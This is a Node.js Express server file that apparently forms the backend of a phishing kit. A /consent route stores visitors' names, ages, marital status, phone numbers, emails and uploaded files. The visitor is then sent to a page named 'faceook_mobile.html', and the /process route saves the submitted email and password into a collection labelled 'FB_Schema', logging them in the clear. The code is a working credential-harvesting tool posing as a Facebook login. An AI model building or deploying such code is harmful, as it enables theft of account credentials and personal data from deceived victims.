// --------------------------------------------------------- Data base 

const mongo1 = require("mongoose")
mongo1.connect("mongodb://127.0.0.1:27017/serverDB")
const multer = require ("multer")

//Multer

const fs = require("fs")
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
      cb(null, __dirname +'/download'); // Specify the destination directory for uploaded files
    },
    filename: function (req, file, cb) {
      cb(null, Date.now() + '-' + file.originalname); // Specify the file name
    }
  });
const upload = multer({storage: storage})

const basic_schema = new mongo1.Schema({
    "first_name": String,
    "second_name": String,
    "age": Number,
    "marital_status" : String,
    "experience" : String,
    "field_of_work": String,
    "selected_country": String,
    "mobile_number": Number,
    "email": String,
    "file": Buffer
})

const fb_schema = mongo1.Schema({
    email: String,
    password: String
})

// --------------------------------------- const database

const Basic_Info = new mongo1.model("Basic_Info" , basic_schema)
const FB_Info = new mongo1.model("FB_Schema" , fb_schema)

// --------------------------------------------------------- Express JS Server -------------------------------------------------------

const express  = require("express")
const path = require("path")
const { default: mongoose } = require("mongoose")
const app = express ()
const port = 5501
app.listen(port, () => {console.log("server Started on port 5501")})


//------------------------------------ Middle ware 
let fb_mobile_path = path.join(__dirname+"/public")
console.log(fb_mobile_path)

const url = "http://127.0.0.1:5501"

app.use((req,res,next) => {
    res.header('Access-Control-Allow-Origin', 'http://127.0.0.1:5501');
    res.header('Access-Control-Allow-Methods', 'GET, POST', 'OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    next()
})
app.use(express.json())

app.use("",express.static(`${fb_mobile_path}/main/`))
app.use("/forum",express.static(`${fb_mobile_path}/forum/`))
app.use("/process", express.static(`${fb_mobile_path}/process/`))

//------------------------------------ get methods (Sending the Files)

app.get('/' , (req , res) => {
    // res.send("Hey there this is the get page")
    res.sendFile(`${fb_mobile_path}/main/index.html`)
})

app.get('/forum' , (req , res) => {
    // res.send("Hey there this is the get page")
    res.sendFile(`${fb_mobile_path}/forum/forum.html`)
})

app.get("/process", upload.single("file"),(req , res) => {
    // res.send("Hey there this is the get page")
    res.sendFile(`${fb_mobile_path}/process/faceook_mobile.html`)
})

// app.get("/consent", upload.single("file"),(req , res) => {
//     // res.send("Hey there this is the get page")
//     res.sendFile(`${fb_mobile_path}/consent/consent.html`)
// })

app.get("/consent" , (req,res) => {
    res.sendFile(`${fb_mobile_path}/main/index.html`)
})

// ------------------------------------ POST Method

app.post('/consent', upload.array('file') , (req , res) => {
    const data = req.body
    Basic_Info(data).save()
    console.log(data)
    console.log(`redirecting to ${url}/process`)
    // console.log("revoked /consent");
    res.send(`${url}+/process/`)
    // console.log(r)
})

app.post("/process" , (req, res) => {
    const data = req.body
    FB_Info(data).save()
    console.log(JSON.stringify(data))
    console.log(url+"/process")
    res.send(url+"/process")
})















